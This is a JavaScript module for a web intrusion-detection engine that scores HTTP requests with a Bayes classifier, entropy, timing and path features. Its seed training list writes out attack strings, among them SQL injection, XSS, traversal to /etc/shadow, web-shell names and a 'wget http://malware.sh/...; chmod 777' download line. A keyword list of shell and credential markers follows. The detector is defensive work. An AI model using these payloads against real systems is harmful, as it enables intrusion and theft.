/**
 * DashSec Machine Learning & Adaptive AI Anomaly Detection Engine
 * Multi-Feature Anomaly Scoring, Online Bayesian Learning & Preemptive Defense
 */

const db = require('./database');
const config = require('../config.json');

class MLEngine {
  constructor() {
    this.maliciousTokens = new Map(); // token -> count
    this.benignTokens = new Map();    // token -> count
    this.totalMaliciousDocs = 10;
    this.totalBenignDocs = 50;

    this.ipHistory = new Map(); // ip -> { timestamps: [], paths: Set(), errorCount: 0, totalCount: 0 }
    this.knownPaths = new Set(['/', '/index.html', '/favicon.ico', '/robots.txt', '/contact.php', '/about.php', '/portfolio.php']);

    this.sensitivity = 'BALANCED'; // 'AGGRESSIVE', 'BALANCED', 'CONSERVATIVE'
    this.thresholds = {
      AGGRESSIVE: 0.70,
      BALANCED: 0.80,
      CONSERVATIVE: 0.88
    };

    this.initModel();
  }

  // --- MODEL INITIALIZATION & STATE RESTORATION ---
  initModel() {
    console.log('[ML-Engine] Initializing Machine Learning Model...');
    const savedState = db.getModelState('bayes_weights');
    if (savedState && savedState.maliciousTokens) {
      this.maliciousTokens = new Map(Object.entries(savedState.maliciousTokens));
      this.benignTokens = new Map(Object.entries(savedState.benignTokens || {}));
      this.totalMaliciousDocs = savedState.totalMaliciousDocs || 10;
      this.totalBenignDocs = savedState.totalBenignDocs || 50;
      console.log(`[ML-Engine] Restored model state: ${this.maliciousTokens.size} malicious tokens, ${this.benignTokens.size} benign tokens.`);
    } else {
      this.seedInitialTrainingData();
    }

    // Auto-save model weights every 60s
    setInterval(() => this.persistModelState(), 60000);
  }

  seedInitialTrainingData() {
    const cyberAttacks = [
      "union select 1,2,3,concat(username,password) from users",
      "select * from admin where '1'='1' or sleep(5)",
      "<script>alert(document.cookie)</script>",
      "<svg onload=alert(1)>",
      "../../../../etc/passwd",
      "/..%2f..%2f..%2fetc/shadow",
      "/.git/config /.git/HEAD /.git/index",
      "/.env /wp-config.php phpmyadmin",
      "c99.php r57.php wso.php cmd.php",
      "wget http://malware.sh/mozi.m; chmod 777",
      "sqlmap/1.7 nikto/2.1.6 nuclei/3.0 masscan/1.0"
    ];

    const benignRequests = [
      "GET / HTTP/1.1 Mozilla/5.0 Chrome/120.0.0.0",
      "GET /index.html HTTP/1.1 Mozilla/5.0 Safari/604.1",
      "GET /contact.php HTTP/1.1 Firefox/115.0",
      "GET /assets/css/style.css HTTP/1.1",
      "GET /assets/js/main.js HTTP/1.1",
      "GET /images/logo.png HTTP/1.1",
      "GET /portfolio.php?category=web HTTP/1.1",
      "GET /robots.txt HTTP/1.1 Googlebot/2.1"
    ];

    for (const text of cyberAttacks) {
      this.learnSample(text, true);
    }
    for (const text of benignRequests) {
      this.learnSample(text, false);
    }
    this.persistModelState();
    console.log('[ML-Engine] Pre-trained with initial baseline cybersecurity vectors.');
  }

  persistModelState() {
    try {
      const stateObj = {
        maliciousTokens: Object.fromEntries(this.maliciousTokens),
        benignTokens: Object.fromEntries(this.benignTokens),
        totalMaliciousDocs: this.totalMaliciousDocs,
        totalBenignDocs: this.totalBenignDocs,
        savedAt: new Date().toISOString()
      };
      db.saveModelState('bayes_weights', stateObj);
    } catch (e) {
      console.error('[ML-Engine] Failed to persist state:', e.message);
    }
  }

  // --- FEATURE EXTRACTION ---

  // 1. Shannon Entropy (Randomness detector for encoded / obfuscated payloads)
  calculateEntropy(str) {
    if (!str || str.length === 0) return 0.0;
    const freq = new Map();
    for (let i = 0; i < str.length; i++) {
      const char = str[i];
      freq.set(char, (freq.get(char) || 0) + 1);
    }

    let entropy = 0.0;
    const len = str.length;
    for (const count of freq.values()) {
      const p = count / len;
      entropy -= p * Math.log2(p);
    }
    return parseFloat(entropy.toFixed(3));
  }

  // 2. Token Extraction (N-Grams & Semantic subwords)
  extractTokens(str) {
    if (!str) return [];
    const normalized = str.toLowerCase().replace(/['"()=;,<>`]/g, ' ');
    const words = normalized.split(/\s+/).filter(w => w.length >= 2);
    const tokens = new Set(words);

    // Extract sub-tokens (e.g. `../`, `0x`, `php://`, `.env`, `base64`)
    const specialSubstrings = [
      '../', '..\\', '%2e%2e', '0x', '0b', 'eval(', 'base64', 'passwd', 'shadow',
      '.env', '.git', 'select', 'union', 'sleep', 'benchmark', 'script', 'onerror',
      'php://', 'data://', 'cmd', 'shell', 'wget', 'curl', 'chmod'
    ];
    for (const sub of specialSubstrings) {
      if (str.toLowerCase().includes(sub)) {
        tokens.add(sub);
      }
    }
    return Array.from(tokens);
  }

  // 3. Behavioral Velocity & Inter-arrival Anomaly
  calculateVelocityAnomaly(ip) {
    const now = Date.now();
    let record = this.ipHistory.get(ip);
    if (!record) {
      record = { timestamps: [], paths: new Set(), errorCount: 0, totalCount: 0 };
      this.ipHistory.set(ip, record);
    }

    record.totalCount++;
    record.timestamps = record.timestamps.filter(t => now - t < 15000); // 15s window
    record.timestamps.push(now);

    const count = record.timestamps.length;
    if (count <= 2) return 0.1;

    // Calculate inter-arrival intervals
    const intervals = [];
    for (let i = 1; i < record.timestamps.length; i++) {
      intervals.push(record.timestamps[i] - record.timestamps[i - 1]);
    }

    // Mean interval
    const mean = intervals.reduce((a, b) => a + b, 0) / intervals.length;
    // Variance (High cadence / zero variance indicates automated scripts/bots)
    const variance = intervals.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / intervals.length;
    const stdDev = Math.sqrt(variance);

    // If requests are rapid (<300ms) with very low stdDev (<50ms) -> High Bot Probability
    let score = 0.0;
    if (mean < 400) score += 0.5;
    if (stdDev < 80 && count > 5) score += 0.35; // Automated bot timing precision
    if (count > 25) score += 0.3;

    return Math.min(1.0, parseFloat(score.toFixed(3)));
  }

  // 4. Path Novelty Score
  calculatePathNovelty(pathStr) {
    if (!pathStr) return 0.0;
    const cleanPath = pathStr.split('?')[0];
    if (this.knownPaths.has(cleanPath)) return 0.0;

    // Novelty calculation based on suspicious markers
    let novelty = 0.2;
    if (cleanPath.includes('.php') || cleanPath.includes('.env') || cleanPath.includes('.git') || cleanPath.includes('.yml')) {
      novelty += 0.5;
    }
    if (cleanPath.length > 50 || (cleanPath.match(/\//g) || []).length > 4) {
      novelty += 0.3;
    }
    return Math.min(1.0, parseFloat(novelty.toFixed(3)));
  }

  // --- ONLINE BAYESIAN CLASSIFIER INFERENCE ---
  classifyText(text) {
    const tokens = this.extractTokens(text);
    if (tokens.length === 0) return { prob: 0.1, confidence: 0.5 };

    let logLikelihoodMalicious = Math.log(this.totalMaliciousDocs / (this.totalMaliciousDocs + this.totalBenignDocs));
    let logLikelihoodBenign = Math.log(this.totalBenignDocs / (this.totalMaliciousDocs + this.totalBenignDocs));

    const totalMalTokens = Array.from(this.maliciousTokens.values()).reduce((a, b) => a + b, 0) + 1;
    const totalBenignTokens = Array.from(this.benignTokens.values()).reduce((a, b) => a + b, 0) + 1;
    const vocabSize = new Set([...this.maliciousTokens.keys(), ...this.benignTokens.keys()]).size + 1;

    for (const token of tokens) {
      const malCount = this.maliciousTokens.get(token) || 0;
      const benCount = this.benignTokens.get(token) || 0;

      // Laplace smoothing
      const pTokenMal = (malCount + 1) / (totalMalTokens + vocabSize);
      const pTokenBen = (benCount + 1) / (totalBenignTokens + vocabSize);

      logLikelihoodMalicious += Math.log(pTokenMal);
      logLikelihoodBenign += Math.log(pTokenBen);
    }

    // Convert to probability using sigmoid of log difference
    const diff = logLikelihoodMalicious - logLikelihoodBenign;
    const probMalicious = 1 / (1 + Math.exp(-diff));
    const confidence = Math.abs(probMalicious - 0.5) * 2; // 0.0 to 1.0

    return {
      prob: parseFloat(probMalicious.toFixed(4)),
      confidence: parseFloat(confidence.toFixed(4)),
      tokensCount: tokens.length
    };
  }

  // --- CONTINUOUS ONLINE LEARNING ---
  learnSample(text, isMalicious = true) {
    const tokens = this.extractTokens(text);
    if (isMalicious) {
      this.totalMaliciousDocs++;
      for (const t of tokens) {
        this.maliciousTokens.set(t, (this.maliciousTokens.get(t) || 0) + 1);
      }
    } else {
      this.totalBenignDocs++;
      for (const t of tokens) {
        this.benignTokens.set(t, (this.benignTokens.get(t) || 0) + 1);
      }
    }
  }

  // --- COMPREHENSIVE REQUEST ANALYSIS & ML DECISION ---
  analyzeRequest({ ip, requestLine = '', userAgent = '', rawLine = '', statusCode = 200 }) {
    const fullText = `${requestLine} ${userAgent} ${rawLine}`;
    
    // 1. Feature Extraction
    const entropy = this.calculateEntropy(fullText);
    const entropyScore = Math.min(1.0, Math.max(0.0, (entropy - 3.4) / 2.0)); // >4.5 is anomalous

    const bayesResult = this.classifyText(fullText);
    const velocityScore = this.calculateVelocityAnomaly(ip);
    const pathNovelty = this.calculatePathNovelty(requestLine);

    // 2. Weighted Ensemble Anomaly Score Calculation
    // AnomalyScore = 0.35 * Bayes + 0.25 * Entropy + 0.25 * Velocity + 0.15 * Novelty
    const anomalyScore = parseFloat((
      (bayesResult.prob * 0.38) +
      (entropyScore * 0.24) +
      (velocityScore * 0.24) +
      (pathNovelty * 0.14)
    ).toFixed(3));

    // 3. Classification Determination
    const threshold = this.thresholds[this.sensitivity] || 0.80;
    let classification = 'BENIGN';
    let actionTaken = 'Monitored by ML';

    if (anomalyScore >= threshold) {
      classification = 'PREEMPTIVE_BLOCK';
      actionTaken = `Auto-Blocked by ML Engine (Anomaly: ${Math.round(anomalyScore * 100)}%, Conf: ${Math.round(bayesResult.confidence * 100)}%)`;
      // Immediately learn this sample as malicious for continuous reinforcement
      this.learnSample(fullText, true);
    } else if (anomalyScore >= 0.55) {
      classification = 'SUSPICIOUS';
      actionTaken = 'Flagged Suspicious by ML';
    } else {
      classification = 'BENIGN';
      actionTaken = 'Pass (Normal Pattern)';
      // Learn as benign if clean
      if (Math.random() < 0.1) this.learnSample(fullText, false);
    }

    // 4. Update IP Dynamic Reputation
    db.updateIPReputation(ip, anomalyScore, classification === 'PREEMPTIVE_BLOCK');

    // 5. Record ML Insight
    const insightId = db.addMLInsight({
      ip,
      attack_probability: bayesResult.prob,
      anomaly_score: anomalyScore,
      entropy: entropy,
      token_score: bayesResult.prob,
      velocity_score: velocityScore,
      classification,
      model_confidence: bayesResult.confidence,
      payload_snippet: requestLine.substring(0, 150),
      action_taken: actionTaken
    });

    return {
      id: insightId,
      ip,
      anomalyScore,
      attackProbability: bayesResult.prob,
      entropy,
      velocityScore,
      pathNovelty,
      confidence: bayesResult.confidence,
      classification,
      actionTaken,
      isPreemptiveBan: classification === 'PREEMPTIVE_BLOCK'
    };
  }

  setSensitivity(level) {
    if (this.thresholds[level]) {
      this.sensitivity = level;
      console.log(`[ML-Engine] Sensitivity updated to: ${level} (Threshold: ${this.thresholds[level]})`);
      return true;
    }
    return false;
  }
}

module.exports = new MLEngine();
